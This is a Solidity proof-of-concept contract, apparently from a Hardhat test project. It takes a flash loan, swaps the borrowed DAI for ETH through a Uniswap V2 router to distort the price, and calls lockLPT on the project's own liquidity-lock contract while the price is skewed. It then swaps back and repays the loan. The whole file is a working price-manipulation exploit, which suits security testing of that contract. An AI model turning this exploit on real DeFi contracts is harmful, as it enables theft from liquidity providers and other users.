pragma solidity >=0.4.26 <0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import './uniswap/uniswapPeriph/interfaces/IUniswapV2Router02.sol';
import "../LiquidityLockContracts/LLC_EthDai.sol";
import "./SimpleFlashLoan.sol";
import "./ISimpleFlashBorrower.sol";

import "hardhat/console.sol";

contract FlashLoanAttacker is ISimpleFlashBorrower {
    
    IERC20 private _daiToken;
    IERC20 private _ethToken;
    IERC20 private _lptToken;
    LLC_EthDai private _llc;
    SimpleFlashLoan private _lendingPool;
    IUniswapV2Router02 private _uniswapRouter;

    uint256 _loanSize;
    uint256 _lockValue;

    constructor(address lendingPool, address daiToken, address ethToken, uint256 loanSize, uint256 lockValue,
                    address uniswapRouter, address lptToken, address LLC) {
        _daiToken = IERC20(daiToken);
        _ethToken = IERC20(ethToken);
        _lptToken = IERC20(lptToken);
        _lendingPool = SimpleFlashLoan(lendingPool);
        _uniswapRouter = IUniswapV2Router02(uniswapRouter);
        _llc = LLC_EthDai(LLC);

        _loanSize = loanSize;
        _lockValue = lockValue;
    }

    function attack() public {

        _lendingPool.flashLoan(_loanSize);
    }

    function execute() external override {
        require(_daiToken.approve(address(_uniswapRouter), _loanSize), 'approve failed.');

        // Set up

        address[] memory ethToDaiPath = new address[](2);
        ethToDaiPath[0] = address(_ethToken);
        ethToDaiPath[1] = address(_daiToken);

        address[] memory path = new address[](2);
        path[0] = address(_daiToken);
        path[1] = address(_ethToken);

        console.log("ETH");
        console.log( _ethToken.balanceOf(address(this)) / 10**18);
        console.log("DAI");
        console.log(_daiToken.balanceOf(address(this)) / 10**18);
        uint256 previousDaiBalanceDAI = _daiToken.balanceOf(address(this));

        console.log("---");
        uint[] memory amounts = _uniswapRouter.getAmountsOut(70 ether, ethToDaiPath);
        console.log(amounts[amounts.length - 1]);
        console.log("---");
// INITIAL 
// 38m DAI -> 26k ETH
        _uniswapRouter.swapExactTokensForTokens(_loanSize, 10 ether, path, address(this), block.timestamp + 100);
// INBALANCE
// 26k ETH -> ? 38? 21m
        uint256 ethBalance = _ethToken.balanceOf(address(this));      

        // Exploit

        require(_lptToken.approve(address(_llc), _lockValue), 'approve failed.');
        _llc.lockLPT(_lockValue, 1);

        // Clean up

        require(_ethToken.approve(address(_uniswapRouter), ethBalance), 'approve failed.');  

        address[] memory path2 = new address[](2);
        path2[0] = address(_ethToken);
        path2[1] = address(_daiToken);

        console.log("ETH");
        console.log( _ethToken.balanceOf(address(this)) / 10**18);
        console.log("DAI");
        console.log(_daiToken.balanceOf(address(this)) / 10**18);

        console.log("DAI/ETH");
        uint rate = uint(previousDaiBalanceDAI - _daiToken.balanceOf(address(this))) / uint(_ethToken.balanceOf(address(this))); 
        console.log(rate);

        console.log("---");
        amounts = _uniswapRouter.getAmountsOut(70 ether, ethToDaiPath);
        console.log(amounts[amounts.length - 1]);
        console.log("---");

        _uniswapRouter.swapExactTokensForTokens(ethBalance, _loanSize * 995 / 1000, path2, address(this), block.timestamp + 100);

        console.log("ETH");
        console.log( _ethToken.balanceOf(address(this)) / 10**18);
        console.log("DAI");
        console.log(_daiToken.balanceOf(address(this)) / 10**18);

        console.log("DAI/ETH");
        rate = uint(_daiToken.balanceOf(address(this)) / uint(ethBalance)); 
        console.log(rate);

        _daiToken.transfer(address(_lendingPool), _loanSize);
    } 

}